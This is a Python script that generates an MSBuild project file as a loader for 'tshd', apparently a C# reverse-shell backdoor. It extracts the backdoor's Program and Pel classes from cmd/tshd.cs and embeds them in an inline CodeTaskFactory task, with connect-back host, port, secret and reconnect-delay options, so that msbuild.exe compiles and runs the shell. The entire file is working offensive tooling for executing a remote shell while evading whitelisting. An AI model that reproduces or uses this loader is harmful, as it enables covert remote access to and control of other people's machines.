import argparse
import os
import re
import sys

def find_brace_block(text, start_index):
    """
    Finds the content inside a brace block { ... } starting from start_index.
    Returns (content_inside, end_index).
    """
    # Find the first {
    first_brace = text.find('{', start_index)
    if first_brace == -1:
        return None, -1

    count = 1
    i = first_brace + 1
    while i < len(text) and count > 0:
        if text[i] == '{':
            count += 1
        elif text[i] == '}':
            count -= 1
        i += 1

    if count == 0:
        # Return content inside the braces, excluding the braces themselves
        return text[first_brace+1:i-1], i
    return None, -1

def main():
    parser = argparse.ArgumentParser(description="Generate MSBuild loader for tshd")
    parser.add_argument("-c", "--host", help="Connect back host")
    parser.add_argument("-p", "--port", default="1234", help="Port")
    parser.add_argument("-s", "--secret", default="1234", help="Secret")
    parser.add_argument("-d", "--delay", default="5", help="Reconnect delay")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Read original C# code
    tshd_cs_path = os.path.join("cmd", "tshd.cs")
    if not os.path.exists(tshd_cs_path):
        print(f"Error: {tshd_cs_path} not found.")
        return

    with open(tshd_cs_path, "r") as f:
        cs_code = f.read()

    cmd_args = []
    if args.host:
        cmd_args.extend(["-c", args.host])
    if args.port:
        cmd_args.extend(["-p", args.port])
    if args.secret:
        cmd_args.extend(["-s", args.secret])
    if args.delay:
        cmd_args.extend(["-d", args.delay])

    args_str = ", ".join([f'"{x}"' for x in cmd_args])

    # Extract Usings
    using_lines = re.findall(r'^using .*?;', cs_code, re.MULTILINE)

    # Extract class Program content
    # Regex to find "class Program"
    prog_match = re.search(r'class\s+Program', cs_code)
    if not prog_match:
        print("Error: class Program not found")
        return

    program_content, _ = find_brace_block(cs_code, prog_match.end())
    if program_content is None:
        print("Error: Could not extract Program body")
        return

    # Extract class Pel (entire class)
    pel_match = re.search(r'class\s+Pel', cs_code)
    if not pel_match:
        print("Error: class Pel not found")
        return

    # We want the whole class definition, not just body, because we'll nest it
    # So find the body, then reconstruct "class Pel ..." + body + "}"
    # Or just extract the body and wrap it?
    # Or better: extract from "class Pel" until the closing brace.

    pel_body_content, pel_end_idx = find_brace_block(cs_code, pel_match.end())
    if pel_body_content is None:
        print("Error: Could not extract Pel body")
        return

    # Reconstruct Pel class definition.
    # We need to know if it implements interfaces etc.
    # In tshd.cs: class Pel : Stream
    # Let's capture the declaration line up to the brace.
    decl_start = pel_match.start()
    decl_end = cs_code.find('{', decl_start)
    pel_decl = cs_code[decl_start:decl_end].strip()

    pel_full_class = f"{pel_decl}\n{{\n{pel_body_content}\n}}"


    # Construct the XML
    xml_template = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RunTshd">
    <TshdTask />
  </Target>
  <UsingTask
    TaskName="TshdTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Reference Include="System.Xml"/>
      <Code Type="Class" Language="cs">
        <![CDATA[
{chr(10).join(using_lines)}
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class TshdTask : Task
{{
    public override bool Execute()
    {{
        try
        {{
            string[] args = new string[] {{ {args_str} }};
            Main(args);
        }}
        catch (Exception ex)
        {{
            Console.WriteLine("Error: " + ex.Message);
        }}
        return true;
    }}

    // Content of Program class
    {program_content}

    // Nested Pel class
    {pel_full_class}
}}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""

    if args.output:
        with open(args.output, "w") as f:
            f.write(xml_template)
        print(f"Written to {args.output}")
    else:
        print(xml_template)

if __name__ == "__main__":
    main()
